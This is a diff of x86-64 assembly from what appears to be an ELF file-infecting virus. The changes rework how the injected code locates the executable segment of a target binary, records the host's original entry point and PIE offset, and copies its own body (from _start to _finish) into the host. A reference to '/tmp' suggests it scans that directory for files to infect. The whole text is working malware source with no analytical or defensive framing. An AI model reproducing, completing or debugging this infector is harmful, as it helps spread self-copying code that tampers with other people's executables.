@@ -41,15 +41,10 @@ _start:
                 push        rcx
                 push        rdx
 
+                lea         rax, [rel _start]
                 mov         rdx, [rel pie_address]
-                mov         rax, [rel entry]
-                test        rdx, rdx
-                jz          .entry_ready
-                lea         rcx, [rel .delta]
-.delta:         sub         rcx, .delta - _start
-                sub         rcx, rdx
-                add         rax, rcx
-.entry_ready:
+                sub         rax, rdx
+                add         rax, [rel entry]
                 push        rax
 
                 lea         rdi, [rel slash_tmp]
@@ -199,15 +194,16 @@ insert:                                                         ; expecting data
                 mov         rax, 0x0000000500000001             ; p_flags = PF_X | PF_R, p_type = PT_LOAD
                 cmp         rax, qword [rdi]
                 jnz         .next
-                mov         rax, qword [rdi + 8]                ; p_offset
-                add         rax, qword [rdi + 0x10]             ; p_vaddr
+                mov         rax, qword [rdi + 0x10]             ; p_vaddr
                 cmp         rdx, rax
                 jb          .next
-                add         rax, qword [rdi + 0x20]             ; p_vaddr + p_offset + p_filesz
+                add         rax, qword [rdi + 0x28]             ; p_vaddr + p_memsz
                 mov         r13, rax                            ; new entry point
                 cmp         rdx, rax
                 jae         .next
-                sub         rax, qword [rdi + 0x10]             ; rax = p_offset + p_filesz
+
+                mov         rax, qword [rdi + 0x08]             ; rax = p_offset
+                add         rax, qword [rdi + 0x20]             ; rax += p_filesz
 
                 mov         r14, rdi                            ; code segment Elf64_Phdr*
 
@@ -222,15 +218,7 @@ insert:                                                         ; expecting data
 
                 mov         rax, qword [r15 + 0x18]             ; entry point
                 mov         [rel entry], rax
-
-                xor         rax, rax
-                mov         [rel pie_address], rax
-
-                mov         ax, word [r15 + 0x10]               ; e_type
-                cmp         ax, 2                               ; ET_EXEC
-                jz          .no_pie
                 mov         [rel pie_address], r13
-.no_pie:
                 lea         rdi, [rel _start]
                 xchg        rdi, rsi
                 mov         rcx, _finish - _start
